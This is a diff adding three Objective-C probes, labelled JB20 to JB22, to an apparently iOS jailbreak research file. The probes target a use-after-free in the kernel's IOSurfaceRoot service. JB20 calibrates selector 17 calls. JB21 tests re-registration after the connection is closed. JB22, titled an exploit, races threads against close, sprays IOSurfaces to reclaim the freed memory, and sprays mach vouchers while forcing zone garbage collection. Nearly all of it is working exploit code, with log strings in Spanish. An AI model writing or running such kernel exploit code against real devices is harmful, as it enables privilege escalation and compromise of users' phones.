@@ -26484,6 +26484,569 @@ void iosurface_kptr_oracle(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done)
     });
 }
 
+#pragma mark - Probe JB20: IOSurfaceRoot UAF Calibration
+
+typedef kern_return_t (*ISR_AsyncCallFn)(io_connect_t, uint32_t, mach_port_t,
+    uint64_t *, uint32_t, const uint64_t *, uint32_t,
+    const void *, size_t, void *, uint32_t *,
+    uint64_t *, uint32_t *);
+
+static kern_return_t jb20_call_sel(io_connect_t c, uint32_t sel, uint64_t *in3,
+                                    size_t inSz, int shape, ISR_AsyncCallFn asyncCall,
+                                    ISR_CallFn syncCall) {
+    uint64_t buf[3] = { 0, 0, 0 };
+    if (in3) { buf[0] = in3[0]; buf[1] = in3[1]; buf[2] = in3[2]; }
+    uint64_t ref  = 0x1122334455667788ull;
+    uint64_t zero = 0;
+    uint32_t soc  = 0;
+    if (shape == 0) {
+        if (!syncCall) return KERN_FAILURE;
+        return syncCall(c, sel, NULL, 0, buf, inSz, NULL, NULL, NULL, NULL);
+    }
+    if (!asyncCall) return KERN_FAILURE;
+    mach_port_t wp = MACH_PORT_NULL;
+    kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp);
+    if (kr != KERN_SUCCESS) return kr;
+    if (shape == 1)
+        kr = asyncCall(c, sel, wp, &ref, 1, NULL, 0, buf, inSz, NULL, &soc, NULL, NULL);
+    else if (shape == 2)
+        kr = asyncCall(c, sel, wp, &zero, 1, NULL, 0, buf, inSz, NULL, &soc, NULL, NULL);
+    else
+        kr = asyncCall(c, sel, wp, NULL, 0, NULL, 0, buf, inSz, NULL, &soc, NULL, NULL);
+    mach_port_mod_refs(mach_task_self(), wp, MACH_PORT_RIGHT_RECEIVE, -1);
+    return kr;
+}
+
+void iosurface_sysctl_leak(ISRLogBlock log, ISRDoneBlock done) {
+    atomic_store(&g_isr_stop, false);
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        ISRSymbols sym;
+        int calibShape = -1;
+        int sel17Results[4] = {0};
+        int sel18Sync = -1;
+        int serviceFound = 0;
+        int connOK = 0;
+        int asyncAvail = 0;
+
+        if (!isr_load(&sym)) {
+            log(@"[JB20] ERROR: no se pudo cargar frameworks");
+            done(@{@"status": @"error", @"reason": @"dlopen_failed"});
+            return;
+        }
+
+        ISR_AsyncCallFn asyncCall = (ISR_AsyncCallFn)dlsym(sym.iokit, "IOConnectCallAsyncMethod");
+        asyncAvail = asyncCall != NULL;
+        log([NSString stringWithFormat:@"[JB20] IOConnectCallAsyncMethod: %s",
+             asyncAvail ? "DISPONIBLE" : "NO ENCONTRADA"]);
+
+        if (!asyncAvail) {
+            log(@"[JB20] ERROR: IOConnectCallAsyncMethod no disponible — no se puede explotar UAF");
+            isr_unload(&sym);
+            done(@{@"status": @"error", @"reason": @"no_async_method"});
+            return;
+        }
+
+        CFMutableDictionaryRef matching = sym.matching("IOSurfaceRoot");
+        io_service_t svc = 0;
+        if (matching) svc = sym.getMatch(kIOMainPortDefault, matching);
+        if (!svc) {
+            matching = sym.matching("IOCoreSurfaceRoot");
+            if (matching) svc = sym.getMatch(kIOMainPortDefault, matching);
+        }
+        serviceFound = (svc != 0);
+        log([NSString stringWithFormat:@"[JB20] IOSurfaceRoot service: %s (0x%x)",
+             serviceFound ? "ENCONTRADO" : "NO ENCONTRADO", svc]);
+
+        if (!serviceFound) {
+            isr_unload(&sym);
+            done(@{@"status": @"error", @"reason": @"no_service"});
+            return;
+        }
+
+        uint64_t in3[3] = { 1, 2, 3 };
+
+        for (int shape = 0; shape < 4; shape++) {
+            if (isr_stopped()) break;
+            io_connect_t c = 0;
+            kern_return_t kr = sym.open(svc, mach_task_self(), 0, &c);
+            if (kr != KERN_SUCCESS) {
+                sel17Results[shape] = -1;
+                log([NSString stringWithFormat:@"[JB20] shape %d: IOServiceOpen falló kr=0x%x", shape, kr]);
+                continue;
+            }
+            connOK = 1;
+            kern_return_t r = jb20_call_sel(c, 17, in3, 24, shape, asyncCall, sym.call);
+            sel17Results[shape] = (int)r;
+            log([NSString stringWithFormat:@"[JB20] sel17 shape=%d → 0x%x %s",
+                 shape, (uint32_t)r, (r == KERN_SUCCESS) ? "✓ SUCCESS" : ""]);
+            if (r == KERN_SUCCESS && calibShape < 0) calibShape = shape;
+            sym.close(c);
+        }
+
+        if (!isr_stopped()) {
+            io_connect_t c = 0;
+            kern_return_t kr = sym.open(svc, mach_task_self(), 0, &c);
+            if (kr == KERN_SUCCESS) {
+                kern_return_t r = sym.call(c, 18, NULL, 0, in3, 24, NULL, NULL, NULL, NULL);
+                sel18Sync = (int)r;
+                log([NSString stringWithFormat:@"[JB20] sel18 sync → 0x%x %s",
+                     (uint32_t)r, (r == KERN_SUCCESS) ? "✓ SUCCESS" : ""]);
+                sym.close(c);
+            }
+        }
+
+        if (calibShape >= 0 && !isr_stopped()) {
+            io_connect_t c = 0;
+            kern_return_t kr = sym.open(svc, mach_task_self(), 0, &c);
+            if (kr == KERN_SUCCESS) {
+                kern_return_t r1 = jb20_call_sel(c, 17, in3, 24, calibShape, asyncCall, sym.call);
+                kern_return_t r2 = jb20_call_sel(c, 17, in3, 24, calibShape, asyncCall, sym.call);
+                log([NSString stringWithFormat:@"[JB20] Doble registro: 1º=0x%x 2º=0x%x (esperado 0xC9=InternalError)",
+                     (uint32_t)r1, (uint32_t)r2]);
+
+                mach_port_type_t ptBefore = 0;
+                mach_port_type(mach_task_self(), c, &ptBefore);
+                sym.close(c);
+                mach_port_type_t ptAfter = 0;
+                kern_return_t krPt = mach_port_type(mach_task_self(), c, &ptAfter);
+                log([NSString stringWithFormat:@"[JB20] Port diagnóstico: antes=0x%x después=0x%x (krPt=0x%x)",
+                     ptBefore, ptAfter, krPt]);
+                log([NSString stringWithFormat:@"[JB20] ptAfter 0x10000000=DEAD_NAME → %s",
+                     (ptAfter & 0x10000000) ? "SÍ, puerto muerto tras close" : "NO, puerto aún vivo"]);
+            }
+        }
+
+        if (calibShape >= 0 && !isr_stopped()) {
+            io_connect_t c = 0;
+            kern_return_t kr = sym.open(svc, mach_task_self(), 0, &c);
+            if (kr == KERN_SUCCESS) {
+                mach_port_mod_refs(mach_task_self(), c, MACH_PORT_RIGHT_SEND, +1);
+                kern_return_t r1 = jb20_call_sel(c, 17, in3, 24, calibShape, asyncCall, sym.call);
+                sym.close(c);
+                mach_port_type_t ptAfter = 0;
+                mach_port_type(mach_task_self(), c, &ptAfter);
+                kern_return_t rPost = jb20_call_sel(c, 17, in3, 24, calibShape, asyncCall, sym.call);
+                log([NSString stringWithFormat:@"[JB20] +1 send ref: reg=0x%x, post-close port=0x%x, re-reg=0x%x",
+                     (uint32_t)r1, ptAfter, (uint32_t)rPost]);
+                log([NSString stringWithFormat:@"[JB20] ★ Post-close re-register: %s",
+                     (rPost == KERN_SUCCESS) ? "¡ÉXITO! — VULNERABLE a UAF" : "BLOQUEADO"]);
+                mach_port_deallocate(mach_task_self(), c);
+            }
+        }
+
+        log([NSString stringWithFormat:@"[JB20] === RESULTADO: calibShape=%d ===", calibShape]);
+        sym.release(svc);
+        isr_unload(&sym);
+
+        done(@{
+            @"status": calibShape >= 0 ? @"success" : @"no_shape_found",
+            @"calibShape": @(calibShape),
+            @"sel17_shape0": [NSString stringWithFormat:@"0x%x", sel17Results[0]],
+            @"sel17_shape1": [NSString stringWithFormat:@"0x%x", sel17Results[1]],
+            @"sel17_shape2": [NSString stringWithFormat:@"0x%x", sel17Results[2]],
+            @"sel17_shape3": [NSString stringWithFormat:@"0x%x", sel17Results[3]],
+            @"sel18_sync": [NSString stringWithFormat:@"0x%x", sel18Sync],
+            @"asyncAvailable": @(asyncAvail),
+            @"serviceFound": @(serviceFound),
+            @"connOK": @(connOK)
+        });
+    });
+}
+
+#pragma mark - Probe JB21: IOSurfaceRoot UAF Trigger
+
+void iosurface_pixelbuf_scan(ISRLogBlock log, ISRDoneBlock done) {
+    atomic_store(&g_isr_stop, false);
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        ISRSymbols sym;
+        int calibShape = -1;
+        int regOK = 0, deregOK = 0, reregOK = 0;
+        int teardownReregOK = 0;
+        int portSurvived = 0;
+        int totalTests = 0;
+
+        if (!isr_load(&sym)) {
+            log(@"[JB21] ERROR: no se pudo cargar frameworks");
+            done(@{@"status": @"error", @"reason": @"dlopen_failed"});
+            return;
+        }
+
+        ISR_AsyncCallFn asyncCall = (ISR_AsyncCallFn)dlsym(sym.iokit, "IOConnectCallAsyncMethod");
+        if (!asyncCall) {
+            log(@"[JB21] ERROR: IOConnectCallAsyncMethod no disponible");
+            isr_unload(&sym);
+            done(@{@"status": @"error", @"reason": @"no_async"});
+            return;
+        }
+
+        CFMutableDictionaryRef matching = sym.matching("IOSurfaceRoot");
+        io_service_t svc = 0;
+        if (matching) svc = sym.getMatch(kIOMainPortDefault, matching);
+        if (!svc) {
+            matching = sym.matching("IOCoreSurfaceRoot");
+            if (matching) svc = sym.getMatch(kIOMainPortDefault, matching);
+        }
+        if (!svc) {
+            log(@"[JB21] ERROR: IOSurfaceRoot no encontrado");
+            isr_unload(&sym);
+            done(@{@"status": @"error", @"reason": @"no_service"});
+            return;
+        }
+
+        uint64_t in3[3] = { 1, 2, 3 };
+
+        log(@"[JB21] Fase 1: Calibración rápida sel17...");
+        for (int shape = 1; shape < 4; shape++) {
+            if (isr_stopped()) break;
+            io_connect_t c = 0;
+            if (sym.open(svc, mach_task_self(), 0, &c) != KERN_SUCCESS) continue;
+            kern_return_t r = jb20_call_sel(c, 17, in3, 24, shape, asyncCall, sym.call);
+            if (r == KERN_SUCCESS && calibShape < 0) calibShape = shape;
+            sym.close(c);
+        }
+
+        if (calibShape < 0) {
+            log(@"[JB21] ERROR: ningún shape funciona para sel17");
+            sym.release(svc);
+            isr_unload(&sym);
+            done(@{@"status": @"error", @"reason": @"calibration_failed"});
+            return;
+        }
+        log([NSString stringWithFormat:@"[JB21] Calibrado: shape=%d", calibShape]);
+
+        log(@"[JB21] Fase 2: Test Registro→Desregistro→Re-registro (V_SEQ1817)...");
+        if (!isr_stopped()) {
+            io_connect_t c = 0;
+            if (sym.open(svc, mach_task_self(), 0, &c) == KERN_SUCCESS) {
+                mach_port_mod_refs(mach_task_self(), c, MACH_PORT_RIGHT_SEND, +1);
+
+                kern_return_t r1 = jb20_call_sel(c, 17, in3, 24, calibShape, asyncCall, sym.call);
+                regOK = (r1 == KERN_SUCCESS);
+                log([NSString stringWithFormat:@"[JB21] 1. Registro: 0x%x %s", (uint32_t)r1,
+                     regOK ? "✓" : "✗"]);
+
+                kern_return_t r_dup = jb20_call_sel(c, 17, in3, 24, calibShape, asyncCall, sym.call);
+                log([NSString stringWithFormat:@"[JB21] 2. Doble registro: 0x%x (esperado 0xE00002C9)",
+                     (uint32_t)r_dup]);
+
+                sym.close(c);
+
+                mach_port_type_t pt = 0;
+                kern_return_t krPt = mach_port_type(mach_task_self(), c, &pt);
+                portSurvived = (krPt == KERN_SUCCESS && !(pt & 0x10000000));
+                log([NSString stringWithFormat:@"[JB21] 3. IOServiceClose — port tipo=0x%x %s",
+                     pt, portSurvived ? "★ VIVO" : "muerto"]);
+
+                kern_return_t r3 = jb20_call_sel(c, 17, in3, 24, calibShape, asyncCall, sym.call);
+                teardownReregOK = (r3 == KERN_SUCCESS);
+                log([NSString stringWithFormat:@"[JB21] 4. Re-registro post-close: 0x%x %s",
+                     (uint32_t)r3, teardownReregOK ? "★★★ UAF CONFIRMADO" : "(bloqueado)"]);
+
+                kern_return_t r4 = jb20_call_sel(c, 17, in3, 24, calibShape, asyncCall, sym.call);
+                log([NSString stringWithFormat:@"[JB21] 5. Segundo re-registro: 0x%x", (uint32_t)r4]);
+
+                mach_port_deallocate(mach_task_self(), c);
+                totalTests++;
+            }
+        }
+
+        log(@"[JB21] Fase 3: Test Registro→sel18 Desregistro→Re-registro (V_REPLANT)...");
+        if (!isr_stopped()) {
+            io_connect_t c = 0;
+            if (sym.open(svc, mach_task_self(), 0, &c) == KERN_SUCCESS) {
+                kern_return_t r1 = jb20_call_sel(c, 17, in3, 24, calibShape, asyncCall, sym.call);
+                deregOK = 0; reregOK = 0;
+                log([NSString stringWithFormat:@"[JB21] V_REPLANT 1. Registro: 0x%x", (uint32_t)r1]);
+
+                uint64_t buf18[3] = { 1, 2, 3 };
+                kern_return_t r2 = sym.call(c, 18, NULL, 0, buf18, 24, NULL, NULL, NULL, NULL);
+                deregOK = (r2 == KERN_SUCCESS);
+                log([NSString stringWithFormat:@"[JB21] V_REPLANT 2. sel18 desregistro: 0x%x %s",
+                     (uint32_t)r2, deregOK ? "✓" : "✗"]);
+
+                kern_return_t r3 = jb20_call_sel(c, 17, in3, 24, calibShape, asyncCall, sym.call);
+                reregOK = (r3 == KERN_SUCCESS);
+                log([NSString stringWithFormat:@"[JB21] V_REPLANT 3. Re-registro: 0x%x %s",
+                     (uint32_t)r3, reregOK ? "★★★ VULNERABLE — re-registro tras desregistro" : "(bloqueado por +0xf1)"]);
+
+                sym.close(c);
+                totalTests++;
+            }
+        }
+
+        log(@"[JB21] Fase 4: Port diagnóstico con extra +1 send ref...");
+        if (!isr_stopped()) {
+            for (int extra = 0; extra <= 1; extra++) {
+                io_connect_t c = 0;
+                if (sym.open(svc, mach_task_self(), 0, &c) != KERN_SUCCESS) continue;
+                if (extra) mach_port_mod_refs(mach_task_self(), c, MACH_PORT_RIGHT_SEND, +1);
+                jb20_call_sel(c, 17, in3, 24, calibShape, asyncCall, sym.call);
+                sym.close(c);
+                mach_port_type_t pt = 0;
+                kern_return_t krPt = mach_port_type(mach_task_self(), c, &pt);
+                kern_return_t krMod = mach_port_mod_refs(mach_task_self(), c, MACH_PORT_RIGHT_SEND, +1);
+                kern_return_t rPost = jb20_call_sel(c, 17, in3, 24, calibShape, asyncCall, sym.call);
+                log([NSString stringWithFormat:@"[JB21] PORTDIAG extra=%d: pt=0x%x krPt=0x%x krMod=0x%x post=0x%x",
+                     extra, pt, krPt, krMod, (uint32_t)rPost]);
+                if (extra) mach_port_deallocate(mach_task_self(), c);
+                totalTests++;
+            }
+        }
+
+        NSString *verdict = @"UNKNOWN";
+        if (teardownReregOK || reregOK) verdict = @"VULNERABLE";
+        else if (regOK) verdict = @"PATCHED_0xf1";
+        else verdict = @"SEL17_BLOCKED";
+
+        log([NSString stringWithFormat:@"[JB21] === VEREDICTO: %@ ===", verdict]);
+
+        sym.release(svc);
+        isr_unload(&sym);
+
+        done(@{
+            @"status": @"complete",
+            @"verdict": verdict,
+            @"calibShape": @(calibShape),
+            @"regOK": @(regOK),
+            @"deregOK": @(deregOK),
+            @"reregOK": @(reregOK),
+            @"teardownReregOK": @(teardownReregOK),
+            @"portSurvived": @(portSurvived),
+            @"totalTests": @(totalTests)
+        });
+    });
+}
+
+#pragma mark - Probe JB22: IOSurfaceRoot UAF Exploit
+
+void iosurface_pipe_primitive(ISRLogBlock log, ISRDoneBlock done) {
+    atomic_store(&g_isr_stop, false);
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        ISRSymbols sym;
+        int calibShape = -1;
+        int uafTriggered = 0;
+        int sprayHits = 0;
+        int racesRun = 0;
+        int postCloseSuccesses = 0;
+
+        if (!isr_load(&sym)) {
+            log(@"[JB22] ERROR: no se pudo cargar frameworks");
+            done(@{@"status": @"error", @"reason": @"dlopen_failed"});
+            return;
+        }
+
+        ISR_AsyncCallFn asyncCall = (ISR_AsyncCallFn)dlsym(sym.iokit, "IOConnectCallAsyncMethod");
+        if (!asyncCall) {
+            log(@"[JB22] ERROR: IOConnectCallAsyncMethod no disponible");
+            isr_unload(&sym);
+            done(@{@"status": @"error", @"reason": @"no_async"});
+            return;
+        }
+
+        CFMutableDictionaryRef matching = sym.matching("IOSurfaceRoot");
+        io_service_t svc = 0;
+        if (matching) svc = sym.getMatch(kIOMainPortDefault, matching);
+        if (!svc) {
+            matching = sym.matching("IOCoreSurfaceRoot");
+            if (matching) svc = sym.getMatch(kIOMainPortDefault, matching);
+        }
+        if (!svc) {
+            log(@"[JB22] ERROR: IOSurfaceRoot no encontrado");
+            isr_unload(&sym);
+            done(@{@"status": @"error", @"reason": @"no_service"});
+            return;
+        }
+
+        uint64_t in3[3] = { 1, 2, 3 };
+
+        for (int shape = 1; shape < 4; shape++) {
+            if (isr_stopped()) break;
+            io_connect_t c = 0;
+            if (sym.open(svc, mach_task_self(), 0, &c) != KERN_SUCCESS) continue;
+            kern_return_t r = jb20_call_sel(c, 17, in3, 24, shape, asyncCall, sym.call);
+            if (r == KERN_SUCCESS && calibShape < 0) calibShape = shape;
+            sym.close(c);
+        }
+
+        if (calibShape < 0) {
+            log(@"[JB22] ERROR: calibración fallida");
+            sym.release(svc);
+            isr_unload(&sym);
+            done(@{@"status": @"error", @"reason": @"calibration_failed"});
+            return;
+        }
+
+        log([NSString stringWithFormat:@"[JB22] Calibrado shape=%d. A15 chip → sin MTE", calibShape]);
+
+        log(@"[JB22] Fase 1: TEARREG — registro concurrente + close (8 iteraciones)...");
+        for (int iter = 0; iter < 8 && !isr_stopped(); iter++) {
+            int offsets[5] = { 0, 50, 100, 200, 500 };
+            int off = offsets[iter % 5];
+
+            io_connect_t c = 0;
+            if (sym.open(svc, mach_task_self(), 0, &c) != KERN_SUCCESS) continue;
+            mach_port_mod_refs(mach_task_self(), c, MACH_PORT_RIGHT_SEND, +1);
+
+            jb20_call_sel(c, 17, in3, 24, calibShape, asyncCall, sym.call);
+
+            volatile int spamRun = 1;
+            __block volatile uint64_t okCount = 0;
+            __block volatile uint64_t tryCount = 0;
+            __block volatile uint32_t lastRc = 0;
+
+            dispatch_group_t grp = dispatch_group_create();
+            for (int t = 0; t < 6; t++) {
+                dispatch_group_async(grp, dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+                    uint64_t tin[3] = { 1, 2, 3 };
+                    while (spamRun) {
+                        kern_return_t r = jb20_call_sel(c, 17, tin, 24, calibShape, asyncCall, sym.call);
+                        if (r == KERN_SUCCESS) __sync_fetch_and_add((volatile int64_t *)&okCount, 1);
+                        else lastRc = (uint32_t)r;
+                        __sync_fetch_and_add((volatile int64_t *)&tryCount, 1);
+                    }
+                });
+            }
+
+            if (off > 0) usleep((useconds_t)off);
+            uint64_t okPre = okCount;
+            sym.close(c);
+            usleep(2000);
+            *((volatile int *)&spamRun) = 0;
+            dispatch_group_wait(grp, DISPATCH_TIME_FOREVER);
+
+            uint64_t okPost = okCount - okPre;
+            if (okPost > 0) postCloseSuccesses += (int)okPost;
+
+            log([NSString stringWithFormat:@"[JB22] TEARREG[%d] off=%d try=%llu ok=%llu pre=%llu post=%llu lastRc=0x%x %s",
+                 iter, off, (unsigned long long)tryCount, (unsigned long long)okCount,
+                 (unsigned long long)okPre, (unsigned long long)okPost,
+                 lastRc, okPost > 0 ? "★ POST-CLOSE HIT" : ""]);
+
+            mach_port_deallocate(mach_task_self(), c);
+            racesRun++;
+        }
+
+        log(@"[JB22] Fase 2: Heap spray post-UAF — creando surfaces para reclamar memoria...");
+        if (!isr_stopped()) {
+            io_connect_t c = 0;
+            if (sym.open(svc, mach_task_self(), 0, &c) == KERN_SUCCESS) {
+                mach_port_mod_refs(mach_task_self(), c, MACH_PORT_RIGHT_SEND, +1);
+
+                kern_return_t r1 = jb20_call_sel(c, 17, in3, 24, calibShape, asyncCall, sym.call);
+                uafTriggered = (r1 == KERN_SUCCESS);
+
+                sym.close(c);
+
+                kern_return_t rPost = jb20_call_sel(c, 17, in3, 24, calibShape, asyncCall, sym.call);
+                if (rPost == KERN_SUCCESS) {
+                    log(@"[JB22] ★★★ Re-registro post-close EXITOSO — nodo colgante creado");
+                    uafTriggered = 1;
+
+                    NSDictionary *surfParams = isr_default_surface_params(64, 4);
+                    IOSurfaceRef *spray = (IOSurfaceRef *)calloc(64, sizeof(IOSurfaceRef));
+                    if (spray) {
+                        int created = 0;
+                        for (int i = 0; i < 64 && !isr_stopped(); i++) {
+                            spray[i] = sym.create((__bridge CFDictionaryRef)surfParams);
+                            if (spray[i]) created++;
+                        }
+                        log([NSString stringWithFormat:@"[JB22] Spray: %d surfaces creadas para reclamar memoria", created]);
+                        sprayHits = created;
+
+                        IOSurfaceRef mainSurf = sym.create((__bridge CFDictionaryRef)surfParams);
+                        if (mainSurf) {
+                            uint32_t gid = sym.getID(mainSurf);
+                            IOSurfaceRef s2 = sym.lookup(gid);
+                            log([NSString stringWithFormat:@"[JB22] Surface principal: ID=%u, lookup=%s",
+                                 gid, s2 ? "OK" : "NULL"]);
+
+                            usleep(20000);
+                            CFRelease(mainSurf);
+                            usleep(200000);
+                            if (s2) {
+                                log(@"[JB22] Liberando segunda referencia — trigger walk del kernel...");
+                                CFRelease(s2);
+                            }
+                            log(@"[JB22] ★ Walk completado sin crash — kernel procesó el nodo colgante");
+                        }
+
+                        for (int i = 0; i < 64; i++) {
+                            if (spray[i]) CFRelease(spray[i]);
+                        }
+                        free(spray);
+                    }
+                } else {
+                    log([NSString stringWithFormat:@"[JB22] Re-registro post-close falló: 0x%x — puede estar parchado",
+                         (uint32_t)rPost]);
+                }
+
+                mach_port_deallocate(mach_task_self(), c);
+            }
+        }
+
+        log(@"[JB22] Fase 3: Voucher spray + UAF combo...");
+        if (!isr_stopped() && uafTriggered) {
+            typedef kern_return_t (*HostSetFn)(host_t, mach_voucher_attr_raw_recipe_array_t, mach_msg_type_number_t, mach_voucher_t *);
+            HostSetFn hostCreate = (HostSetFn)dlsym(RTLD_DEFAULT, "host_create_mach_voucher");
+            if (hostCreate) {
+                mach_voucher_t *vouchers = (mach_voucher_t *)calloc(256, sizeof(mach_voucher_t));
+                if (vouchers) {
+                    int vCreated = 0;
+                    for (int i = 0; i < 256 && !isr_stopped(); i++) {
+                        uint8_t recipe[256];
+                        memset(recipe, 0, sizeof(recipe));
+                        uint32_t *hdr = (uint32_t *)recipe;
+                        hdr[0] = 7;
+                        hdr[1] = 1;
+                        hdr[2] = 0;
+                        uint32_t contentSz = 64;
+                        hdr[3] = contentSz;
+                        memset(recipe + 16, 0x41 + (i % 26), contentSz);
+                        kern_return_t kr = hostCreate(mach_host_self(), recipe, 16 + contentSz, &vouchers[i]);
+                        if (kr == KERN_SUCCESS) vCreated++;
+                    }
+                    log([NSString stringWithFormat:@"[JB22] Voucher spray: %d/256 creados", vCreated]);
+
+                    typedef kern_return_t (*ZoneGCFn)(host_t);
+                    ZoneGCFn gcFn = (ZoneGCFn)dlsym(RTLD_DEFAULT, "mach_zone_force_gc");
+                    if (gcFn) {
+                        kern_return_t gcr = gcFn(mach_host_self());
+                        log([NSString stringWithFormat:@"[JB22] mach_zone_force_gc: 0x%x", gcr]);
+                    }
+
+                    for (int i = 0; i < 256; i++) {
+                        if (vouchers[i]) mach_voucher_attr_discard(vouchers[i]);
+                    }
+                    free(vouchers);
+                }
+            }
+        }
+
+        NSString *verdict = @"UNKNOWN";
+        if (uafTriggered && postCloseSuccesses > 0) verdict = @"UAF_ACTIVE";
+        else if (uafTriggered) verdict = @"UAF_TRIGGERED_NO_RACE_WIN";
+        else if (postCloseSuccesses > 0) verdict = @"RACE_WINDOW_EXISTS";
+        else verdict = @"PROTECTED";
+
+        log([NSString stringWithFormat:@"[JB22] === VEREDICTO: %@ ===", verdict]);
+        log([NSString stringWithFormat:@"[JB22] racesRun=%d postCloseOK=%d sprayHits=%d uafTriggered=%d",
+             racesRun, postCloseSuccesses, sprayHits, uafTriggered]);
+
+        sym.release(svc);
+        isr_unload(&sym);
+
+        done(@{
+            @"status": @"complete",
+            @"verdict": verdict,
+            @"calibShape": @(calibShape),
+            @"racesRun": @(racesRun),
+            @"postCloseSuccesses": @(postCloseSuccesses),
+            @"sprayHits": @(sprayHits),
+            @"uafTriggered": @(uafTriggered)
+        });
+    });
+}
+
 #pragma mark - Probe 99: Surface Lifecycle TOCTOU Race
 
 static volatile sig_atomic_t g_lifecycle_segv_count = 0;
